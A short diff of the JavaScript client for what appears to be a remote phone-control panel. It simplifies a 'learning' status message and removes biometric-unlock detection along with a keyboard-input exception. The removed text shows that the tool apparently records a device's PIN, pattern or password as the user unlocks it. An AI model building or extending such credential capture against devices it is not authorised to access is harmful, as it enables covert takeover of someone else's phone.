@@ -998,12 +998,7 @@ function connect() {
         else if (data.type === 'learn_status') {
       const box = document.getElementById('tools-result')
       if (data.status === 'started') {
-        box.textContent = data.message ||
-          'Learning active — lock the phone, then unlock with your credential.'
-      } else if (data.status === 'biometric_detected') {
-        box.textContent = data.message ||
-          'Biometric unlock detected — please lock and unlock with your PIN/pattern/password.'
-        beep(1200, 0.06)
+        box.textContent = 'Learning active — unlock phone now'
       } else {
         box.textContent = data.status
       }
@@ -1236,7 +1231,6 @@ wrap.addEventListener('gesturestart', e => e.preventDefault());
 document.addEventListener('keydown', e => {
   if (e.target === document.getElementById('kb-input')) return;
   if (e.target === document.getElementById('privacy-text-input')) return;
-  if (e.target === document.getElementById('auto-click-input')) return;   // 👈 fix
   if (e.repeat) return;
   if (e.key === 'Backspace') { e.preventDefault(); sendMsg({ type:'keyboard', text:'\b' }); }
   else if (e.key === 'Enter') { sendMsg({ type:'keyboard', text:'\n' }); }
